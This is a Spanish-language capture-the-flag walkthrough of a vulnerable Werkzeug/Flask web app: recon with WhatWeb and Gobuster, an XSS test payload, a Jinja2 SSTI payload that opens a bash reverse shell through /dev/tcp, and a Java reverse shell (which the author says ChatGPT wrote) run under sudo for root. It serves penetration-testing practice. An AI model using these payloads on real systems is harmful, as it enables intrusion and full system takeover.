# Reconocimiento

Vemos el puerto 5000 abierto

![[Pasted image 20240521152134.png]]

Vamos a ver qué hay en ese puerto

![[Pasted image 20240521152208.png]]

Nos encontramos esta página web con unos campos para rellenar, vamos a pasarle el WhatWeb a ver qué nos dice

![[Pasted image 20240521152251.png]]

Tenemos diferentes versiones de Werkzeug Python 

Si rellenamos los campos, vemos lo siguiente

![[Pasted image 20240521152407.png]]

Vamos a pasarle Gobuster a ver si encuentra algo y únicamente nos encuentra un /console que nos pide un PIN

![[Pasted image 20240521152535.png]]

## Explotación

En el campo PinguNombre si probamos de inyectar código malicioso como por ejemplo:

```html
<script>alert('XSS')</script>
```
vemos lo siguiente:
![[Pasted image 20240521160929.png]]

Entonces esto es vulnerable a Cross-Site Scripting (XSS). Vamos a intentar otras vulnerabilidades web como HTML Injection

![[Pasted image 20240522100934.png]]
![[Pasted image 20240522100948.png]]

También es vulnerable. Vamos a probar con una vulnerabilidad de SSTI

Accedemos a esta página y nos dirigimos a la parte que dice Exploit the SSTI by calling os.popen().read(

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution

![[Pasted image 20240522101518.png]]

Introducimos este código que lo encontramos en la página de Github y vemos que también es vulnerable.

![[Pasted image 20240522101559.png]]

Ahora vamos a aprovechar el SSTI para mandarnos una reverse shell y poder acceder a la máquina

bash

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read() }}

## Intrusión

Y conseguimos acceder a la máquina

![[Pasted image 20240522102535.png]]

Ahora vamos a buscar la forma de escalar privilegios

## Escalada de privilegios

![[Pasted image 20240522102639.png]]

Vemos que podemos ejecutar Java como root, en GTFOBins no aparece nada y en la máquina no aparece ningún script en Java, entonces le pedimos a ChatGPT que nos haga una Reverse Shell en Java

```java

public class shell {  
  public static void main(String[] args) {  
      Process p;  
      try {  
          p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/4443 0>&1");  
          p.waitFor();  
          p.destroy();  
      } catch (Exception e) {}  
  }  
}
```

Lo ejecutamos de la siguiente forma

```bash
sudo -u root /usr/bin/java /tmp/r.java
```

Y ya somos ROOT
![[Pasted image 20240522103440.png]]
